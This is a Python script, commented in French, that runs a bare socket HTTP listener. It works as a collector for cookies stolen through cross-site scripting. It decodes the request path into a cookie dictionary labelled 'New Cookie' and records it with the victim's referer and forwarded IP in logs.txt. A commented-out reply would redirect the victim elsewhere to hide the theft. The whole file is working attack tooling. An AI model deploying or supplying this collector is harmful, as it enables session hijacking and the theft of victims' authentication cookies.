import urllib.parse
from datetime import datetime
import socket
from termcolor import colored


def get_timedate():
    return datetime.now().strftime("[%d/%m/%Y %H:%M:%S]")


SERVER_HOST = '0.0.0.0'
SERVER_PORT = 8090

liste_exclude = ["favicon.ico", "robots.txt"]

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(1)
print(colored('[*] Ecoute sur le port : %s ...\n' % SERVER_PORT, 'blue'))

while True:
    try:
        print(colored("[*] Attente d'une requete\n", 'blue'))
        # Attendre la connection du client
        client_connection, client_address = server_socket.accept()

        # Recuperer la requete
        request = client_connection.recv(4096).decode()

        # Recuperer le headers de la requete
        headers = request.split('\n')

        # Récuperer l'adresse IP et le referer de la requete
        referer = ""
        ip_client = ""
        for h in headers:
            if "Referer: " in h:
                referer = h.replace("Referer: ", "")
            elif "X-Forwarded-For: " in h:
                ip_client = h.replace("X-Forwarded-For: ", "")

        # Récuperer l'URL de la requete / Nettoyer l'URL / Decode URL
        url_requete = urllib.parse.unquote(headers[0].split()[1][1:])

        # Exclure les requetes pour l'icone
        if url_requete not in liste_exclude:
            print(colored('#' * 40 + ' REQUETE ' + '#' * 40, 'green'))
            timedate = get_timedate()
            print(timedate + "\n")
            if referer != "":
                print(colored('Referer : {}\n'.format(referer), 'blue'))
            if ip_client != "":
                print(colored('IP : {}\n'.format(ip_client), 'blue'))
            print(request)
            print()

            print(colored("[+] New Cookie\n", 'green'))

            # Créer le dictionnaire du cookie
            dict_cookie = {}
            for p in url_requete.split(';'):
                k = p.split('=')[0].strip()
                v = p.replace(k + "=", '').strip()
                dict_cookie[k] = v
            print(str(dict_cookie) + "\n\n")

            # Log des données
            with open('logs.txt', 'a') as wFile:
                wFile.write('#' * 40 + ' REQUETE ' + '#' * 40 + "\n")
                wFile.write(timedate + "\n\n")
                if referer != "":
                    wFile.write('[+] Referer : {}\n\n'.format(referer))
                if ip_client != "":
                    wFile.write('[+] IP : {}\n\n'.format(ip_client))
                wFile.write(request + "\n\n")
                wFile.write('[+] Cookie\n\n')
                wFile.write(str(dict_cookie) + "\n\n")

        else:
            print(colored('[*] Reponse caché car non interressante\n', 'red'))

        # Envoyer la reponse HTTP
        # response = 'HTTP/1.0 200 OK\n\n<script>window.location = "https://www.google.com/";</script>'
        response = 'HTTP/1.0 200 OK\n\n'
        client_connection.sendall(response.encode())
        client_connection.close()

    # Fermer le serveur
    except KeyboardInterrupt:
        print(colored('[*] Fermeture du serveur', 'red'))
        break
    except Exception as e:
        print(colored('[-] Erreur: {}'.format(e), 'red'))

server_socket.close()
print(colored('[*] Serveur fermé', 'red'))
